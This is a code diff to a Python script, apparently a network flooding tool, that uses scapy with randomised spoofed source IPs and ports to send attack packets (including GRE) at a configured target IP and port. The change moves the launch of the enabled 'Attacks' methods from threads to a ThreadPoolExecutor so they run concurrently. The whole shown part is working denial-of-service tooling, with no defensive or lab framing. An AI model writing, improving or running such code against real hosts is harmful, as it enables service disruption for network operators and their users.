@@ -5,6 +5,7 @@ import threading
 from scapy.all import IP, TCP, UDP, GRE, Raw, RandIP, RandShort, send
 import logging
 import configparser
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -132,17 +133,11 @@ def main():
         "send_gre_ip_packets": send_gre_ip_packets
     }
 
-    for method in config.options("Attacks"):
-        if config.getboolean("Attacks", method):
-            logging.info(f"Starting {method} on {target_ip}:{target_port}")
-            t = threading.Thread(target=attack_methods[method], args=(target_ip, target_port))
-            threads.append(t)
-
-    for thread in threads:
-        thread.start()
-
-    for thread in threads:
-        thread.join()
+    with ThreadPoolExecutor(max_workers=4) as executor:
+        for method in config.options("Attacks"):
+            if config.getboolean("Attacks", method):
+                logging.info(f"Starting {method} on {target_ip}:{target_port}")
+                executor.submit(attack_methods[method], target_ip, target_port)
 
 if __name__ == "__main__":
     main()
